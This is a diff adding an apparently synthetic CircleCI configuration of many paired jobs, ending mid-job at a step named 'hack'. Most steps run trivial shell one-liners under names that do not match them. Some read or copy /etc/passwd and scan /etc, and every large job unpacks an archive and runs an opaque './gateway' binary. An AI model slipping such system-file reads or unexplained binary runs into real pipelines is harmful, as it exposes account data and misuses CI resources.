@@ -1,0 +1,1701 @@
+version: 2.1
+
+jobs:
+  fossspashuemprs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Issue the exit interviews week one
+          command: |
+            mkdir -p /var/tmp/b1
+            set +o pipefail 2>/dev/null; printf '%s\n' "stage1" "stage2" "stage3" | yes | head -n 1212482 | md5sum > /var/tmp/b1/2024-10-12T02-31; true
+            ls -la /var/tmp/b1/2024-10-12T02-31 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '2024-10-12T02-31'
+  tweak-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/2024-10-12T02-31 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  L_payment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Op 014 silver layer validation
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; echo -n "cold outside" | sha256sum; true ; } > /var/tmp/b1/audit-3e870b.log
+            ls -la /var/tmp/b1/audit-3e870b.log | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'audit-3e870b.log'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/audit-3e870b.log 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  decodeWithWindow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Fold in the release candidate
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; touch ${TMPDIR:-/tmp}/garlic.txt ${TMPDIR:-/tmp}/fixes.bak && ls -l ${TMPDIR:-/tmp}/garlic.txt ${TMPDIR:-/tmp}/fixes.bak; true ; } > /var/tmp/b1/glacier_theta_atom
+            ls -la /var/tmp/b1/glacier_theta_atom | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'glacier_theta_atom'
+  verify-full-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/glacier_theta_atom 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  complexFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Throttling the upstream please wait
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; SUFFIX='c5.md' && printf '%s\n' "${SUFFIX#*.}"; true ; } > /var/tmp/b1/227.189.151.98
+            ls -la /var/tmp/b1/227.189.151.98 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '227.189.151.98'
+  d-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/227.189.151.98 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  dwFlagsDiscountClosedMenu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Eval Metric Fine Tuning Task
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; grep -IlR case /etc 2> /dev/null | nl | head -n 8; true ; } > /var/tmp/b1/river_queue_tundra
+            ls -la /var/tmp/b1/river_queue_tundra | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'river_queue_tundra'
+  v7-beta4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/river_queue_tundra 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  TAX_EXTERNAL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: duct tape
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; yes "night mode on" | head -n 2; true ; } > /var/tmp/b1/temp53b5
+            ls -la /var/tmp/b1/temp53b5 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'temp53b5'
+  europa-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/temp53b5 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  W_TAU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: still welcoming headcount plan
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; grep -qs "bin/sh" /etc/shells&&echo present || echo absent; true ; } > /var/tmp/b1/VID_00072330
+            ls -la /var/tmp/b1/VID_00072330 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'VID_00072330'
+  ken-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/VID_00072330 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  maple_sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: bar
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; echo d2hhdCdzIG5leHQ/Cg==|base64 -d; true ; } > /var/tmp/b1/14go0n3a57
+            ls -la /var/tmp/b1/14go0n3a57 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '14go0n3a57'
+  feb12-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/14go0n3a57 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  login_10_4_22:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Can we thank the team yet
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; echo "hey you" && echo "maybe later"; true ; } > /var/tmp/b1/lagoonOrchardFrozen
+            ls -la /var/tmp/b1/lagoonOrchardFrozen | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'lagoonOrchardFrozen'
+  tweak-router-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/lagoonOrchardFrozen 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  weIGHt__ShIpMENt__cLEAR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: offboardOrgChart
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; set -- wolf noon top; shift; echo $@; true ; } > /var/tmp/b1/E
+            ls -la /var/tmp/b1/E | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'E'
+  fix-9370:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/E 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Bring maintenance mode out of the cloud
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; cp /etc/passwd /tmp/shippingquery.conf && sed -i -e 's/:x:/:*:/' /tmp/shippingquery.conf && diff /etc/passwd /tmp/shippingquery.conf | head -n 5; true ; } > /var/tmp/b1/gOldeNvAllEYCeDaRdRAft
+            ls -la /var/tmp/b1/gOldeNvAllEYCeDaRdRAft | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'gOldeNvAllEYCeDaRdRAft'
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/gOldeNvAllEYCeDaRdRAft 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  yankee-india-mike:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: alloc log dir
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; for val in $(seq 3); do printf '%d %d\n' $val $((val * 3)); done|paste -sd ' '; true ; } > /var/tmp/b1/audit_20220707
+            ls -la /var/tmp/b1/audit_20220707 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'audit_20220707'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/audit_20220707 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  sec-31275-total:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: P 120 shift roster badging
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,kiwi,17,15.70\n2,orange,17,65.17\n3,lemon,10,9.63\n4,apple,12,79.27\n'|sort -t, -k4 -rn | head -n 2; true ; } > /var/tmp/b1/tmp519
+            ls -la /var/tmp/b1/tmp519 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'tmp519'
+  v7-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/tmp519 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  BaseRatioVisitor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: WEIGH THE SKUS BY NOON
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep -iE "/var|bash" | cut -d: -f1; true ; } > /var/tmp/b1/garden.zinc.quick.polar
+            ls -la /var/tmp/b1/garden.zinc.quick.polar | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'garden.zinc.quick.polar'
+  qi-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/garden.zinc.quick.polar 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  sys_ReceiveWake:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Scan Vault Task
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; echo "we're live" | fold -w 8; true ; } > /var/tmp/b1/LOADER_HAWK_PHOTON_PROFILE
+            ls -la /var/tmp/b1/LOADER_HAWK_PHOTON_PROFILE | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'LOADER_HAWK_PHOTON_PROFILE'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/LOADER_HAWK_PHOTON_PROFILE 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  Union-Title:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Wait 45 seconds
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; counter='market.csv' && printf '%s\n' "${counter:1}"; true ; } > /var/tmp/b1/72wCFNfkwNxt5phYuFL2BH
+            ls -la /var/tmp/b1/72wCFNfkwNxt5phYuFL2BH | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '72wCFNfkwNxt5phYuFL2BH'
+  orion-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/72wCFNfkwNxt5phYuFL2BH 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  VbRFfZs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: dpl3 ga
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; touch /tmp/old-inbox-archive.txt && chmod 644 /tmp/old-inbox-archive.txt && stat -c "%A %n" /tmp/old-inbox-archive.txt; true ; } > /var/tmp/b1/trace-0c57c5.log
+            ls -la /var/tmp/b1/trace-0c57c5.log | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'trace-0c57c5.log'
+  DEPLOY_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/trace-0c57c5.log 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  uk_nz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: I own pager rotation restart
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; test ! -f ~/.bashrc && echo good || echo "bad"; true ; } > /var/tmp/b1/fermion-wallet-bronze-east
+            ls -la /var/tmp/b1/fermion-wallet-bronze-east | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'fermion-wallet-bronze-east'
+  APP-275:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/fermion-wallet-bronze-east 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  lkp_SEMAPHORE_PIXEL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Evening build
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/playground-old"/worker && rm -rf "${TMPDIR:-/tmp}/playground-old" && echo removed; true ; } > /var/tmp/b1/20230412_021036
+            ls -la /var/tmp/b1/20230412_021036 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '20230412_021036'
+  atlas-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/20230412_021036 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  postDialogRecord:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Timeout 20s on the share sheet
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -pcR /sys/class/net | sed -n '1~2p'; true ; } > /var/tmp/b1/enginequeuetone
+            ls -la /var/tmp/b1/enginequeuetone | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'enginequeuetone'
+  ensure-end-to-end-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/enginequeuetone 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  aliases:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Vectors to sweep
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; if test -d /tmp; then echo 'present'; fi; true ; } > /var/tmp/b1/PRoXywilloWtHUndErKAPPa
+            ls -la /var/tmp/b1/PRoXywilloWtHUndErKAPPa | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'PRoXywilloWtHUndErKAPPa'
+  Deploy_Image3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/PRoXywilloWtHUndErKAPPa 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  IN-OUT-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Import Scope Subset
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; echo '   leading spaces' | tr ' ' '\n' | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | paste -sd ' '; true ; } > /var/tmp/b1/bondp4cke7
+            ls -la /var/tmp/b1/bondp4cke7 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'bondp4cke7'
+  wip-dashboard-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/bondp4cke7 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  hey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Clear to route the express lane
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; sed 's/=.*//' /etc/os-release | awk '{print length, $0}' | nl; true ; } > /var/tmp/b1/dev_82680
+            ls -la /var/tmp/b1/dev_82680 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'dev_82680'
+  add-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/dev_82680 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  refrenceSetting:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: If the credit notes are slow bail out
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; set -o | awk '{print $1}' | awk '{print toupper(substr($0,1,1)) substr($0,2)}'; true ; } > /var/tmp/b1/BUNDLE
+            ls -la /var/tmp/b1/BUNDLE | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'BUNDLE'
+  Rollout_Image8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/BUNDLE 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  SmallBit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Shift lead text
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; sum=addon printenv sum; true ; } > /var/tmp/b1/release_80522
+            ls -la /var/tmp/b1/release_80522 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - 'release_80522'
+  QA_MERGE_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/release_80522 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  nLogins:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Obtain approval prior to ranking of the product catalog
+          command: |
+            mkdir -p /var/tmp/b1
+            { set +o pipefail 2>/dev/null; printf %s 'missing value' | sha1sum | awk '{print $1}'; true ; } > /var/tmp/b1/232.117.141
+            ls -la /var/tmp/b1/232.117.141 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/b1
+          paths:
+            - '232.117.141'
+  victor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: Check stage 1
+          command: |
+            awk 'END{print "last line was",NR}' /var/tmp/b1/232.117.141 2>/dev/null || true
+      - run:
+          name: Checkout code
+          command: git clone --depth 1 --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar xf main-pkg.tar
+      - run:
+          command: /bin/sh -c "./gateway"
+  MAT2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/b1
+      - run:
+          name: hack
+          command: |
